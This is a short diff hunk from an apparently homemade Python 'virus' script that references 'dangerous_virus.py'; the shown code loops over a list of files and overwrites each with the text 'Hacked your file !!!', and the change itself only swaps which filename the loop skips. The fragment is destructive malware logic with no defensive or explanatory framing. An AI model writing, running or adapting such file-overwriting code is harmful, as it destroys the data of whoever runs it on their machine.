@@ -9,7 +9,7 @@ mydestroyList.remove("dangerous_virus.py")
 fp.close()
 
 for filek in mydestroyList:
-	if filek != "deadly.py" and filek != "index.dat":
+	if filek != "dangerous.py" and filek != "index.dat":
 		try:
 			fpp = open(filek,"w")
 			fpp.write("Hacked your file !!!")
